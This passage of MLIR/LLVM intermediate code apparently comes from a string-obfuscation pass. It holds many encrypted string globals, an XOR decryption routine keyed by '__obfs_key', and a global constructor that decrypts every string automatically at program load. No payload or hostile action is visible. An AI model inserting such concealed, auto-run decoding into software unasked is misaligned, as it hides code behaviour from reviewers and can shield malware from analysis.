    %226 = llvm.mlir.constant(56 : i64) : i64
    %227 = llvm.call @f_61ae7c24(%225, %226) : (!llvm.ptr, i64) -> !llvm.ptr
    %228 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    %229 = llvm.mlir.constant(31 : i64) : i64
    %230 = llvm.call @f_61ae7c24(%228, %229) : (!llvm.ptr, i64) -> !llvm.ptr
    %231 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    %232 = llvm.mlir.constant(45 : i64) : i64
    %233 = llvm.call @f_61ae7c24(%231, %232) : (!llvm.ptr, i64) -> !llvm.ptr
    %234 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    %235 = llvm.mlir.constant(30 : i64) : i64
    %236 = llvm.call @f_61ae7c24(%234, %235) : (!llvm.ptr, i64) -> !llvm.ptr
    %237 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    %238 = llvm.mlir.constant(29 : i64) : i64
    %239 = llvm.call @f_61ae7c24(%237, %238) : (!llvm.ptr, i64) -> !llvm.ptr
    %240 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    %241 = llvm.mlir.constant(20 : i64) : i64
    %242 = llvm.call @f_61ae7c24(%240, %241) : (!llvm.ptr, i64) -> !llvm.ptr
    %243 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    %244 = llvm.mlir.constant(47 : i64) : i64
    %245 = llvm.call @f_61ae7c24(%243, %244) : (!llvm.ptr, i64) -> !llvm.ptr
    %246 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    %247 = llvm.mlir.constant(29 : i64) : i64
    %248 = llvm.call @f_61ae7c24(%246, %247) : (!llvm.ptr, i64) -> !llvm.ptr
    %249 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    %250 = llvm.mlir.constant(46 : i64) : i64
    %251 = llvm.call @f_61ae7c24(%249, %250) : (!llvm.ptr, i64) -> !llvm.ptr
    %252 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    %253 = llvm.mlir.constant(6 : i64) : i64
    %254 = llvm.call @f_61ae7c24(%252, %253) : (!llvm.ptr, i64) -> !llvm.ptr
    %255 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    %256 = llvm.mlir.constant(10 : i64) : i64
    %257 = llvm.call @f_61ae7c24(%255, %256) : (!llvm.ptr, i64) -> !llvm.ptr
    %258 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    %259 = llvm.mlir.constant(11 : i64) : i64
    %260 = llvm.call @f_61ae7c24(%258, %259) : (!llvm.ptr, i64) -> !llvm.ptr
    %261 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    %262 = llvm.mlir.constant(30 : i64) : i64
    %263 = llvm.call @f_61ae7c24(%261, %262) : (!llvm.ptr, i64) -> !llvm.ptr
    %264 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    %265 = llvm.mlir.constant(18 : i64) : i64
    %266 = llvm.call @f_61ae7c24(%264, %265) : (!llvm.ptr, i64) -> !llvm.ptr
    %267 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    %268 = llvm.mlir.constant(20 : i64) : i64
    %269 = llvm.call @f_61ae7c24(%267, %268) : (!llvm.ptr, i64) -> !llvm.ptr
    %270 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    %271 = llvm.mlir.constant(35 : i64) : i64
    %272 = llvm.call @f_61ae7c24(%270, %271) : (!llvm.ptr, i64) -> !llvm.ptr
    %273 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    %274 = llvm.mlir.constant(11 : i64) : i64
    %275 = llvm.call @f_61ae7c24(%273, %274) : (!llvm.ptr, i64) -> !llvm.ptr
    %276 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    %277 = llvm.mlir.constant(35 : i64) : i64
    %278 = llvm.call @f_61ae7c24(%276, %277) : (!llvm.ptr, i64) -> !llvm.ptr
    %279 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    %280 = llvm.mlir.constant(41 : i64) : i64
    %281 = llvm.call @f_61ae7c24(%279, %280) : (!llvm.ptr, i64) -> !llvm.ptr
    %282 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    %283 = llvm.mlir.constant(15 : i64) : i64
    %284 = llvm.call @f_61ae7c24(%282, %283) : (!llvm.ptr, i64) -> !llvm.ptr
    %285 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    %286 = llvm.mlir.constant(12 : i64) : i64
    %287 = llvm.call @f_61ae7c24(%285, %286) : (!llvm.ptr, i64) -> !llvm.ptr
    %288 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    %289 = llvm.mlir.constant(42 : i64) : i64
    %290 = llvm.call @f_61ae7c24(%288, %289) : (!llvm.ptr, i64) -> !llvm.ptr
    %291 = llvm.mlir.addressof @".str.97.enc" : !llvm.ptr
    %292 = llvm.mlir.constant(35 : i64) : i64
    %293 = llvm.call @f_61ae7c24(%291, %292) : (!llvm.ptr, i64) -> !llvm.ptr
    %294 = llvm.mlir.addressof @".str.98.enc" : !llvm.ptr
    %295 = llvm.mlir.constant(16 : i64) : i64
    %296 = llvm.call @f_61ae7c24(%294, %295) : (!llvm.ptr, i64) -> !llvm.ptr
    %297 = llvm.mlir.addressof @".str.99.enc" : !llvm.ptr
    %298 = llvm.mlir.constant(11 : i64) : i64
    %299 = llvm.call @f_61ae7c24(%297, %298) : (!llvm.ptr, i64) -> !llvm.ptr
    %300 = llvm.mlir.addressof @".str.100.enc" : !llvm.ptr
    %301 = llvm.mlir.constant(37 : i64) : i64
    %302 = llvm.call @f_61ae7c24(%300, %301) : (!llvm.ptr, i64) -> !llvm.ptr
    %303 = llvm.mlir.addressof @".str.101.enc" : !llvm.ptr
    %304 = llvm.mlir.constant(31 : i64) : i64
    %305 = llvm.call @f_61ae7c24(%303, %304) : (!llvm.ptr, i64) -> !llvm.ptr
    %306 = llvm.mlir.addressof @".str.102.enc" : !llvm.ptr
    %307 = llvm.mlir.constant(50 : i64) : i64
    %308 = llvm.call @f_61ae7c24(%306, %307) : (!llvm.ptr, i64) -> !llvm.ptr
    %309 = llvm.mlir.addressof @".str.103.enc" : !llvm.ptr
    %310 = llvm.mlir.constant(26 : i64) : i64
    %311 = llvm.call @f_61ae7c24(%309, %310) : (!llvm.ptr, i64) -> !llvm.ptr
    %312 = llvm.mlir.addressof @".str.104.enc" : !llvm.ptr
    %313 = llvm.mlir.constant(32 : i64) : i64
    %314 = llvm.call @f_61ae7c24(%312, %313) : (!llvm.ptr, i64) -> !llvm.ptr
    %315 = llvm.mlir.addressof @".str.105.enc" : !llvm.ptr
    %316 = llvm.mlir.constant(26 : i64) : i64
    %317 = llvm.call @f_61ae7c24(%315, %316) : (!llvm.ptr, i64) -> !llvm.ptr
    %318 = llvm.mlir.addressof @".str.106.enc" : !llvm.ptr
    %319 = llvm.mlir.constant(28 : i64) : i64
    %320 = llvm.call @f_61ae7c24(%318, %319) : (!llvm.ptr, i64) -> !llvm.ptr
    %321 = llvm.mlir.addressof @".str.107.enc" : !llvm.ptr
    %322 = llvm.mlir.constant(49 : i64) : i64
    %323 = llvm.call @f_61ae7c24(%321, %322) : (!llvm.ptr, i64) -> !llvm.ptr
    %324 = llvm.mlir.addressof @".str.108.enc" : !llvm.ptr
    %325 = llvm.mlir.constant(24 : i64) : i64
    %326 = llvm.call @f_61ae7c24(%324, %325) : (!llvm.ptr, i64) -> !llvm.ptr
    %327 = llvm.mlir.addressof @".str.109.enc" : !llvm.ptr
    %328 = llvm.mlir.constant(27 : i64) : i64
    %329 = llvm.call @f_61ae7c24(%327, %328) : (!llvm.ptr, i64) -> !llvm.ptr
    %330 = llvm.mlir.addressof @".str.110.enc" : !llvm.ptr
    %331 = llvm.mlir.constant(44 : i64) : i64
    %332 = llvm.call @f_61ae7c24(%330, %331) : (!llvm.ptr, i64) -> !llvm.ptr
    %333 = llvm.mlir.addressof @".str.111.enc" : !llvm.ptr
    %334 = llvm.mlir.constant(55 : i64) : i64
    %335 = llvm.call @f_61ae7c24(%333, %334) : (!llvm.ptr, i64) -> !llvm.ptr
    %336 = llvm.mlir.addressof @".str.112.enc" : !llvm.ptr
    %337 = llvm.mlir.constant(36 : i64) : i64
    %338 = llvm.call @f_61ae7c24(%336, %337) : (!llvm.ptr, i64) -> !llvm.ptr
    %339 = llvm.mlir.addressof @".str.113.enc" : !llvm.ptr
    %340 = llvm.mlir.constant(51 : i64) : i64
    %341 = llvm.call @f_61ae7c24(%339, %340) : (!llvm.ptr, i64) -> !llvm.ptr
    %342 = llvm.mlir.addressof @".str.114.enc" : !llvm.ptr
    %343 = llvm.mlir.constant(57 : i64) : i64
    %344 = llvm.call @f_61ae7c24(%342, %343) : (!llvm.ptr, i64) -> !llvm.ptr
    llvm.return
  }
  llvm.mlir.global_ctors ctors = [@f_64c2918f, @f_a272e225], priorities = [101 : i32, 101 : i32], data = [#llvm.zero, #llvm.zero]
  llvm.func internal @f_50877ae9(%arg0: !llvm.ptr, %arg1: i32) attributes {no_inline} {
    %0 = llvm.mlir.addressof @__obfs_key : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.constant(1 : i32) : i32
    %3 = llvm.mlir.constant(11 : i32) : i32
    %4 = llvm.alloca %2 x i32 : (i32) -> !llvm.ptr
    llvm.store %1, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb1:  // 2 preds: ^bb0, ^bb2
    %5 = llvm.load %4 : !llvm.ptr -> i32
    %6 = llvm.icmp "slt" %5, %arg1 : i32
    llvm.cond_br %6, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %7 = llvm.load %4 : !llvm.ptr -> i32
    %8 = llvm.sext %7 : i32 to i64
    %9 = llvm.getelementptr %arg0[%8] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %10 = llvm.load %9 : !llvm.ptr -> i8
    %11 = llvm.srem %7, %3 : i32
    %12 = llvm.sext %11 : i32 to i64
    %13 = llvm.getelementptr %0[%12] : (!llvm.ptr, i64) -> !llvm.ptr, i8
    %14 = llvm.load %13 : !llvm.ptr -> i8
    %15 = llvm.xor %10, %14 : i8
    llvm.store %15, %9 : i8, !llvm.ptr
    %16 = llvm.add %7, %2 : i32
    llvm.store %16, %4 : i32, !llvm.ptr
    llvm.br ^bb1
  ^bb3:  // pred: ^bb1
    llvm.return
  }
  llvm.func internal @f_a272e225() attributes {no_inline} {
    %0 = llvm.mlir.constant(51 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%1, %0) : (!llvm.ptr, i32) -> ()
    %2 = llvm.mlir.constant(16 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%3, %2) : (!llvm.ptr, i32) -> ()
    %4 = llvm.mlir.constant(59 : i32) : i32
    %5 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%5, %4) : (!llvm.ptr, i32) -> ()
    %6 = llvm.mlir.constant(48 : i32) : i32
    %7 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%7, %6) : (!llvm.ptr, i32) -> ()
    %8 = llvm.mlir.constant(43 : i32) : i32
    %9 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%9, %8) : (!llvm.ptr, i32) -> ()
    %10 = llvm.mlir.constant(45 : i32) : i32
    %11 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%11, %10) : (!llvm.ptr, i32) -> ()
    %12 = llvm.mlir.constant(62 : i32) : i32
    %13 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%13, %12) : (!llvm.ptr, i32) -> ()
    %14 = llvm.mlir.constant(45 : i32) : i32
    %15 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%15, %14) : (!llvm.ptr, i32) -> ()
    %16 = llvm.mlir.constant(8 : i32) : i32
    %17 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%17, %16) : (!llvm.ptr, i32) -> ()
    %18 = llvm.mlir.constant(11 : i32) : i32
    %19 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%19, %18) : (!llvm.ptr, i32) -> ()
    %20 = llvm.mlir.constant(27 : i32) : i32
    %21 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%21, %20) : (!llvm.ptr, i32) -> ()
    %22 = llvm.mlir.constant(6 : i32) : i32
    %23 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%23, %22) : (!llvm.ptr, i32) -> ()
    %24 = llvm.mlir.constant(28 : i32) : i32
    %25 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%25, %24) : (!llvm.ptr, i32) -> ()
    %26 = llvm.mlir.constant(47 : i32) : i32
    %27 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%27, %26) : (!llvm.ptr, i32) -> ()
    %28 = llvm.mlir.constant(44 : i32) : i32
    %29 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%29, %28) : (!llvm.ptr, i32) -> ()
    %30 = llvm.mlir.constant(25 : i32) : i32
    %31 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%31, %30) : (!llvm.ptr, i32) -> ()
    %32 = llvm.mlir.constant(4 : i32) : i32
    %33 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%33, %32) : (!llvm.ptr, i32) -> ()
    %34 = llvm.mlir.constant(2 : i32) : i32
    %35 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%35, %34) : (!llvm.ptr, i32) -> ()
    %36 = llvm.mlir.constant(3 : i32) : i32
    %37 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%37, %36) : (!llvm.ptr, i32) -> ()
    %38 = llvm.mlir.constant(20 : i32) : i32
    %39 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%39, %38) : (!llvm.ptr, i32) -> ()
    %40 = llvm.mlir.constant(11 : i32) : i32
    %41 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%41, %40) : (!llvm.ptr, i32) -> ()
    %42 = llvm.mlir.constant(51 : i32) : i32
    %43 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%43, %42) : (!llvm.ptr, i32) -> ()
    %44 = llvm.mlir.constant(45 : i32) : i32
    %45 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%45, %44) : (!llvm.ptr, i32) -> ()
    %46 = llvm.mlir.constant(15 : i32) : i32
    %47 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%47, %46) : (!llvm.ptr, i32) -> ()
    %48 = llvm.mlir.constant(14 : i32) : i32
    %49 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%49, %48) : (!llvm.ptr, i32) -> ()
    %50 = llvm.mlir.constant(14 : i32) : i32
    %51 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%51, %50) : (!llvm.ptr, i32) -> ()
    %52 = llvm.mlir.constant(46 : i32) : i32
    %53 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%53, %52) : (!llvm.ptr, i32) -> ()
    %54 = llvm.mlir.constant(11 : i32) : i32
    %55 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%55, %54) : (!llvm.ptr, i32) -> ()
    %56 = llvm.mlir.constant(28 : i32) : i32
    %57 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%57, %56) : (!llvm.ptr, i32) -> ()
    %58 = llvm.mlir.constant(47 : i32) : i32
    %59 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%59, %58) : (!llvm.ptr, i32) -> ()
    %60 = llvm.mlir.constant(58 : i32) : i32
    %61 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%61, %60) : (!llvm.ptr, i32) -> ()
    %62 = llvm.mlir.constant(71 : i32) : i32
    %63 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%63, %62) : (!llvm.ptr, i32) -> ()
    %64 = llvm.mlir.constant(45 : i32) : i32
    %65 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%65, %64) : (!llvm.ptr, i32) -> ()
    %66 = llvm.mlir.constant(27 : i32) : i32
    %67 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%67, %66) : (!llvm.ptr, i32) -> ()
    %68 = llvm.mlir.constant(16 : i32) : i32
    %69 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%69, %68) : (!llvm.ptr, i32) -> ()
    %70 = llvm.mlir.constant(24 : i32) : i32
    %71 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%71, %70) : (!llvm.ptr, i32) -> ()
    %72 = llvm.mlir.constant(10 : i32) : i32
    %73 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%73, %72) : (!llvm.ptr, i32) -> ()
    %74 = llvm.mlir.constant(12 : i32) : i32
    %75 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%75, %74) : (!llvm.ptr, i32) -> ()
    %76 = llvm.mlir.constant(7 : i32) : i32
    %77 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%77, %76) : (!llvm.ptr, i32) -> ()
    %78 = llvm.mlir.constant(53 : i32) : i32
    %79 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%79, %78) : (!llvm.ptr, i32) -> ()
    %80 = llvm.mlir.constant(34 : i32) : i32
    %81 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%81, %80) : (!llvm.ptr, i32) -> ()
    %82 = llvm.mlir.constant(7 : i32) : i32
    %83 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%83, %82) : (!llvm.ptr, i32) -> ()
    %84 = llvm.mlir.constant(46 : i32) : i32
    %85 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%85, %84) : (!llvm.ptr, i32) -> ()
    %86 = llvm.mlir.constant(23 : i32) : i32
    %87 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%87, %86) : (!llvm.ptr, i32) -> ()
    %88 = llvm.mlir.constant(21 : i32) : i32
    %89 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%89, %88) : (!llvm.ptr, i32) -> ()
    %90 = llvm.mlir.constant(43 : i32) : i32
    %91 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%91, %90) : (!llvm.ptr, i32) -> ()
    %92 = llvm.mlir.constant(9 : i32) : i32
    %93 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%93, %92) : (!llvm.ptr, i32) -> ()
    %94 = llvm.mlir.constant(15 : i32) : i32
    %95 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%95, %94) : (!llvm.ptr, i32) -> ()
    %96 = llvm.mlir.constant(10 : i32) : i32
    %97 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%97, %96) : (!llvm.ptr, i32) -> ()
    %98 = llvm.mlir.constant(43 : i32) : i32
    %99 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%99, %98) : (!llvm.ptr, i32) -> ()
    %100 = llvm.mlir.constant(12 : i32) : i32
    %101 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%101, %100) : (!llvm.ptr, i32) -> ()
    %102 = llvm.mlir.constant(13 : i32) : i32
    %103 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%103, %102) : (!llvm.ptr, i32) -> ()
    %104 = llvm.mlir.constant(7 : i32) : i32
    %105 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%105, %104) : (!llvm.ptr, i32) -> ()
    %106 = llvm.mlir.constant(32 : i32) : i32
    %107 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%107, %106) : (!llvm.ptr, i32) -> ()
    %108 = llvm.mlir.constant(18 : i32) : i32
    %109 = llvm.mlir.addressof @".str.55.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%109, %108) : (!llvm.ptr, i32) -> ()
    %110 = llvm.mlir.constant(35 : i32) : i32
    %111 = llvm.mlir.addressof @".str.56.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%111, %110) : (!llvm.ptr, i32) -> ()
    %112 = llvm.mlir.constant(26 : i32) : i32
    %113 = llvm.mlir.addressof @".str.57.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%113, %112) : (!llvm.ptr, i32) -> ()
    %114 = llvm.mlir.constant(29 : i32) : i32
    %115 = llvm.mlir.addressof @".str.58.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%115, %114) : (!llvm.ptr, i32) -> ()
    %116 = llvm.mlir.constant(36 : i32) : i32
    %117 = llvm.mlir.addressof @".str.59.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%117, %116) : (!llvm.ptr, i32) -> ()
    %118 = llvm.mlir.constant(42 : i32) : i32
    %119 = llvm.mlir.addressof @".str.60.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%119, %118) : (!llvm.ptr, i32) -> ()
    %120 = llvm.mlir.constant(27 : i32) : i32
    %121 = llvm.mlir.addressof @".str.61.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%121, %120) : (!llvm.ptr, i32) -> ()
    %122 = llvm.mlir.constant(36 : i32) : i32
    %123 = llvm.mlir.addressof @".str.62.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%123, %122) : (!llvm.ptr, i32) -> ()
    %124 = llvm.mlir.constant(23 : i32) : i32
    %125 = llvm.mlir.addressof @".str.63.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%125, %124) : (!llvm.ptr, i32) -> ()
    %126 = llvm.mlir.constant(10 : i32) : i32
    %127 = llvm.mlir.addressof @".str.64.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%127, %126) : (!llvm.ptr, i32) -> ()
    %128 = llvm.mlir.constant(12 : i32) : i32
    %129 = llvm.mlir.addressof @".str.65.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%129, %128) : (!llvm.ptr, i32) -> ()
    %130 = llvm.mlir.constant(12 : i32) : i32
    %131 = llvm.mlir.addressof @".str.66.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%131, %130) : (!llvm.ptr, i32) -> ()
    %132 = llvm.mlir.constant(8 : i32) : i32
    %133 = llvm.mlir.addressof @".str.67.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%133, %132) : (!llvm.ptr, i32) -> ()
    %134 = llvm.mlir.constant(32 : i32) : i32
    %135 = llvm.mlir.addressof @".str.68.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%135, %134) : (!llvm.ptr, i32) -> ()
    %136 = llvm.mlir.constant(13 : i32) : i32
    %137 = llvm.mlir.addressof @".str.69.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%137, %136) : (!llvm.ptr, i32) -> ()
    %138 = llvm.mlir.constant(13 : i32) : i32
    %139 = llvm.mlir.addressof @".str.70.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%139, %138) : (!llvm.ptr, i32) -> ()
    %140 = llvm.mlir.constant(27 : i32) : i32
    %141 = llvm.mlir.addressof @".str.71.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%141, %140) : (!llvm.ptr, i32) -> ()
    %142 = llvm.mlir.constant(10 : i32) : i32
    %143 = llvm.mlir.addressof @".str.72.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%143, %142) : (!llvm.ptr, i32) -> ()
    %144 = llvm.mlir.constant(14 : i32) : i32
    %145 = llvm.mlir.addressof @".str.73.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%145, %144) : (!llvm.ptr, i32) -> ()
    %146 = llvm.mlir.constant(51 : i32) : i32
    %147 = llvm.mlir.addressof @".str.74.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%147, %146) : (!llvm.ptr, i32) -> ()
    %148 = llvm.mlir.constant(56 : i32) : i32
    %149 = llvm.mlir.addressof @".str.75.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%149, %148) : (!llvm.ptr, i32) -> ()
    %150 = llvm.mlir.constant(31 : i32) : i32
    %151 = llvm.mlir.addressof @".str.76.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%151, %150) : (!llvm.ptr, i32) -> ()
    %152 = llvm.mlir.constant(45 : i32) : i32
    %153 = llvm.mlir.addressof @".str.77.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%153, %152) : (!llvm.ptr, i32) -> ()
    %154 = llvm.mlir.constant(30 : i32) : i32
    %155 = llvm.mlir.addressof @".str.78.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%155, %154) : (!llvm.ptr, i32) -> ()
    %156 = llvm.mlir.constant(29 : i32) : i32
    %157 = llvm.mlir.addressof @".str.79.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%157, %156) : (!llvm.ptr, i32) -> ()
    %158 = llvm.mlir.constant(20 : i32) : i32
    %159 = llvm.mlir.addressof @".str.80.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%159, %158) : (!llvm.ptr, i32) -> ()
    %160 = llvm.mlir.constant(47 : i32) : i32
    %161 = llvm.mlir.addressof @".str.81.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%161, %160) : (!llvm.ptr, i32) -> ()
    %162 = llvm.mlir.constant(29 : i32) : i32
    %163 = llvm.mlir.addressof @".str.82.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%163, %162) : (!llvm.ptr, i32) -> ()
    %164 = llvm.mlir.constant(46 : i32) : i32
    %165 = llvm.mlir.addressof @".str.83.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%165, %164) : (!llvm.ptr, i32) -> ()
    %166 = llvm.mlir.constant(6 : i32) : i32
    %167 = llvm.mlir.addressof @".str.84.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%167, %166) : (!llvm.ptr, i32) -> ()
    %168 = llvm.mlir.constant(10 : i32) : i32
    %169 = llvm.mlir.addressof @".str.85.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%169, %168) : (!llvm.ptr, i32) -> ()
    %170 = llvm.mlir.constant(11 : i32) : i32
    %171 = llvm.mlir.addressof @".str.86.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%171, %170) : (!llvm.ptr, i32) -> ()
    %172 = llvm.mlir.constant(30 : i32) : i32
    %173 = llvm.mlir.addressof @".str.87.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%173, %172) : (!llvm.ptr, i32) -> ()
    %174 = llvm.mlir.constant(18 : i32) : i32
    %175 = llvm.mlir.addressof @".str.88.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%175, %174) : (!llvm.ptr, i32) -> ()
    %176 = llvm.mlir.constant(20 : i32) : i32
    %177 = llvm.mlir.addressof @".str.89.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%177, %176) : (!llvm.ptr, i32) -> ()
    %178 = llvm.mlir.constant(35 : i32) : i32
    %179 = llvm.mlir.addressof @".str.90.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%179, %178) : (!llvm.ptr, i32) -> ()
    %180 = llvm.mlir.constant(11 : i32) : i32
    %181 = llvm.mlir.addressof @".str.91.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%181, %180) : (!llvm.ptr, i32) -> ()
    %182 = llvm.mlir.constant(35 : i32) : i32
    %183 = llvm.mlir.addressof @".str.92.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%183, %182) : (!llvm.ptr, i32) -> ()
    %184 = llvm.mlir.constant(41 : i32) : i32
    %185 = llvm.mlir.addressof @".str.93.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%185, %184) : (!llvm.ptr, i32) -> ()
    %186 = llvm.mlir.constant(15 : i32) : i32
    %187 = llvm.mlir.addressof @".str.94.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%187, %186) : (!llvm.ptr, i32) -> ()
    %188 = llvm.mlir.constant(12 : i32) : i32
    %189 = llvm.mlir.addressof @".str.95.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%189, %188) : (!llvm.ptr, i32) -> ()
    %190 = llvm.mlir.constant(42 : i32) : i32
    %191 = llvm.mlir.addressof @".str.96.enc" : !llvm.ptr
    llvm.call @f_50877ae9(%191, %190) : (!llvm.ptr, i32) -> ()
